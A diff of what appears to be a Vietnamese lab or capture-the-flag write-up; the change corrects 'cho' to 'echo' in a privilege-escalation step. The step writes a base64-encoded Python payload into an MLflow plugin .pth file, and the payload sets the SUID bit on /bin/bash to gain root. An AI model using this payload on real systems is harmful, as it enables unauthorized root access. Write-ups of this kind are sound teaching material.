@@ -47,7 +47,7 @@ weight: Medium
 ![alt text](image-12.png)
 - Viết payload vào plugin để tìm được
 ```python
-cho aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImNobW9kIHUrcyAvYmluL2Jhc2giKQo= | base64 -d > /opt/tools/mlflow_ctl/plugins/dev/rootme.pth
+echo aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImNobW9kIHUrcyAvYmluL2Jhc2giKQo= | base64 -d > /opt/tools/mlflow_ctl/plugins/dev/rootme.pth
 ```
 - Trigger để lên root
 ![alt text](image-14.png)
